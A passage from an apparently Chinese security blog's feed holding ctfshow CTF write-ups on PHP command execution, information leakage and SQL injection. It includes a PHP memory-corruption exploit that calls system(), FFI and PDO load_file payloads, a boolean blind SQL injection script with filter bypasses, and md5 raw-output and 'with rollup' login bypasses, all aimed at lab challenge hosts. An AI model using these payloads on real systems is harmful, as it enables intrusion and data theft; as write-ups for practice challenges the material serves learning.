operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#需要通过url编码哦</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>这会个锤子</del>，给了我也没整出来，暂时放一下</p><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>可以用上一道的方法找到在根目录下的flagc.txt，再include就行了</p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>也是一样</p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只会看flag在哪，在根目录flag36.txt，但include失败，不会了，上面是payload，似乎是用到了数据库。。。真不会</p><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>和上一道一样</p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>先用上面一样的方法找到在根目录下，下面是payload</p><pre class="line-numbers language-none"><code class="language-none">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大概到此，确实是实力不够命令执行就先到这里了，还是学到了很多的知识，还需要加油啊。</p><p><strong><em>2020.1.29</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集+爆破-ctfshow_wp</title>
      <link href="/2020/11/25/xin-xi-shou-ji-ctfshow/"/>
      <url>/2020/11/25/xin-xi-shou-ji-ctfshow/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露与收集-爆破wp及知识点记录"><a href="#信息泄露与收集-爆破wp及知识点记录" class="headerlink" title="信息泄露与收集+爆破wp及知识点记录"></a>信息泄露与收集+爆破wp及知识点记录</h1><p>在ctf中，我们需要通过收集到题目的信息来确认下一步的解题方向，在实战中也需要进行详细的信息收集才能更好的完成攻击，信息的收集是非常重要的。</p><p>有的时候开发者及网站运营者会在不经意间泄露出一些敏感信息，通过一些方法找到他们，会使接下来的攻击更加轻松</p><p>同时对爆破部分题目做记录</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>f12查看源代码。。。嗯不多说，懂得都懂</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>这题还是f12就行了，但考点是不让直接查看源代码，想看在url前加个<code>view-source:</code>就行了</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>抓包得到flag</p><p><img src="/images/image-20201130191904424.png"></p><p>不抓也行</p><p><img src="/images/image-20201130191945619.png"></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>访问robots.txt得到flag文件所在地址，在URL后加上访问即可</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>访问index.phps（phps源码泄露）下载文件，得到flag</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>考察文件备份泄露，在url后加上/<a href="http://www.zip即可得到泄露源码,在源码中有一个提示/">www.zip即可得到泄露源码，在源码中有一个提示</a></p><p><img src="/images/image-20201201211320242.png"></p><p><img src="/images/image-20201201211351191.png"></p><p>输入这个发现是错的，访问url/fl000g.txt,就得到了flag。</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>版本控制，访问url/.git即可获得git源码泄露，获得flag</p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>版本控制，访问url/.svn即可获得svn源码泄露，获得flag</p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>vim缓存泄露：</p><p>原理为：</p><p><code>在vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</code></p><pre class="line-numbers language-none"><code class="language-none">以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp第二次意外退出后，文件名为.index.php.swo第三次产生的缓存文件则为 .index.php.swn注意：index前有 &quot; . <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本题访问url/.index.php.swp即可获得flag</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>在cookie中就可以找到flag</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>域名中隐藏信息，可以通过dns解析出藏在url中的信息，藏在域名的<strong>txt记录</strong></p><p>在命令行里就可以完成，命令为：</p><pre class="line-numbers language-none"><code class="language-none">nslookup -qt&#x3D;txt ctfshow.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20201201213048156.png"></p><p>得到flag</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>首先需要访问robots.txt，获得后台地址/admin</p><p>本题给的提示是：<strong>有时候网站上的公开信息，就是管理员常用密码</strong></p><p>所以在页面上可以找到：</p><p><img src="/images/image-20201201213406512.png"></p><p>这就是密码，进入后台输入admin加密码就可以得到flag了</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>题目提示：<strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></p><p>我们可以在页面中找到document链接，点击进去可以下载一个技术文档，页面中：</p><p><img src="/images/image-20201201213955642.png"></p><p>访问url/system1103/login.php，输入用户名和密码得到flag</p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>题目提示：<strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</strong></p><p>直接按照提示访问url/editor</p><p><img src="/images/image-20201201214756156.png"></p><p>可以访问这样的界面，看一下这些按钮，</p><p><img src="/images/image-20201201215029579.png"></p><p>其中的插入文件：</p><p><img src="/images/image-20201201215128438.png"></p><p>可以看到文件空间，查看</p><p><img src="/images/image-20201201215157079.png"></p><p>根据linux常识可以找到flag页面在var的www里</p><p><img src="/images/image-20201201215311342.png"></p><p>点开nothinghere里就可以得到flag页面的地址了，最后访问</p><p><img src="/images/image-20201201220238797.png"></p><p>即可得到flag</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>先按照hint访问/admin页面，可以看到一个找回密码的东西，再结合题目说的QQ邮箱泄露信息，找这个QQ，会看见其所在地是西安，密保问题输入这个后就进入后台了，得到flag</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>php测试探针若是不及时删除会造成信息泄露，雅黑PHP探针，通过访问url/tz.php可以去到探针页面。访问phpinfo页面，搜索flag，就找了</p><h3 id="web-17"><a href="#web-17" class="headerlink" title="web 17"></a>web 17</h3><p>找ctfer.com的真实IP。ping就好了，最开始ping ctfer.com，发现不对，ping <a href="http://www.ctfer.com就对了/">www.ctfer.com就对了</a></p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>是一个游戏页面，玩了一会觉得没意思了，看js源码，看见里面的：<img src="/images/image-20201201230024280.png" alt="image-20201201230024280"></p><p>这是unicode编码。转一下就得到了flag</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p><img src="/images/image-20201201230859868.png"></p><p>源码就有了，post传参即可</p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><pre class="line-numbers language-none"><code class="language-none">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是题目给出的提示，直接查看url/db/db.mdb 下载文件通过txt打开搜索flag即可</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>不想再去开环境了，放个别人的链接作为记录</p><p><a href="https://blog.csdn.net/i_kei/article/details/110821077">https://blog.csdn.net/i_kei/article/details/110821077</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> witeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web8-11sql注入wp</title>
      <link href="/2020/11/10/ctfshow-web8-10sql-zhu-ru-wp/"/>
      <url>/2020/11/10/ctfshow-web8-10sql-zhu-ru-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="/images/image-20201116211806656.png"></p><p>打开可以看到是get型的注入，试一下：</p><p>发现对单引号，空格都进行了过滤，尝试过滤：</p><p><code>http://54a2bc21-f382-4e3d-a315-8c23ed58a0f3.chall.ctf.show/index.php?id=1/**/or/**/1=1/**/#</code></p><p>可以看到回显，尝试使用union select进行注入，发现union被过滤，尝试大小写，嵌套union绕过，失败，那就不能用union了，使用布尔盲注</p><p><code>http://54a2bc21-f382-4e3d-a315-8c23ed58a0f3.chall.ctf.show/index.php?id=-1/**/or/**/(select(ascii(substr(database(),1,1)))=124)/**/#</code></p><p>发现逗号也被过滤掉了，选择别的方法做substr：</p><p><img src="/images/image-20201116213907911.png"></p><p>使用了from 1 for 1 可以替代1,1这样可以看到回显，接下来就跑脚本就好了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#本题为ctfshow中web8，做了逗号，分号，union过滤，需要用到布尔盲注以及对逗号分号的绕过</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> systable<span class="token operator">=</span><span class="token string">''</span> urlOpen<span class="token operator">=</span><span class="token string">"http://e064a804-0e90-4afd-a606-c2f5bca1620f.chall.ctf.show/index.php?id="</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">#database</span>        <span class="token comment"># payload="0/**/or/**/(ascii(substr((select/**/database())from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>        <span class="token comment">#库名</span>        <span class="token comment"># payload="0/**/or/**/(ascii(substr((select/**/group_concat(schema_name)from/**/information_schema.schemata)from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>        <span class="token comment">#表名</span>        <span class="token comment">#payload="0/**/or/**/(ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>        <span class="token comment">#列名(分号被过滤了，可以用16进制来表示字符串：用编码转换工具转换你要的字符串，前缀 0x 即可。)</span>        <span class="token comment">#payload="0/**/or/**/(ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=0x666c6167)from/**/%d/**/for/**/1)))=%d#" %(i,j)</span>        <span class="token comment">#找出flag</span>        payload<span class="token operator">=</span><span class="token string">"0/**/or/**/(ascii(substr((select/**/group_concat(flag)from/**/flag)from/**/%d/**/for/**/1)))=%d#"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        url <span class="token operator">=</span> urlOpen <span class="token operator">+</span> payload        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>            table<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到flag</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="/images/image-20201116214319756.png"></p><p>一个登陆界面，先试一试，尝试万能密码不管用，别的方法也没找到有明显的不同的，看了一下师傅们 的博客，嗯，index.phps拿源码看，啊这，脑洞还是不够大，我是</p><p><img src="/images/0750AAF4.jpg"></p><p>看一下源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username ='admin' and password ='"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里考察了一个**<em>md5函数**</em>的漏洞，这个函数的调用是为了方便与数据库中加密后的数据进行对比，这里的这个函数的第二个参数默认为<strong>false</strong>，这样会生成一个常规的32位MD5值，但为true的时候就存在漏洞了，当第二个参数为true时，生成的是一个原生的16字符的二进制格式，这意味着，<strong>这里有可能人为输入一个字符串，经加密后的值以二进制格式生成，又被当字符串处理</strong>，让新的字符串中含有可以构造SQL万能密码的’or’的万能密码部分，可以在网上找到这样的payload：</p><pre class="line-numbers language-none"><code class="language-none">ffifdyop129581926211651571912466741651878684928<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两个都可以构造出我们想要的or 万能密码，直接输入密码框就行了，这里如果password位数大于10会直接报错，所以用第一个就好了。</p><p><img src="/images/image-20201116220736606.png"></p><p>得到flag，看似是直接输入密码得到的flag，不知道还以为是爆破出来的，<del>建议把这个字符串加入爆破字典</del>。</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="/images/image-20201116223551053.png"></p><p>依然需要使用index.phps得到源码查看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤的很多，基本啥都过滤了，没思路了，看了hint，说是虚拟表绕过，再看了一下网上的教程，用的是<strong>with rollup</strong>进行注入。</p><p>先简单记录with rollup进行记录，这是一个用在group by后的语句，是对group by分类后的数据再一次进行统计汇总的功能，如果一列的数据不满足with rollup的条件（该列的数据的属性是不相同的）就会在该列中生成一条NULL数据，我们就利用这条NULL数据来进行注入：</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;&amp;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup&#x2F;**&#x2F;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在group by password后，使用with rollup，我们的目的是使得sql查询到的语句为空，让后面的password进行判断时（就是不输入密码时）与这个NULL进行匹配，达到登录成功的目的，输入上面的payload就可以得到flag了，</p><pre class="line-numbers language-none"><code 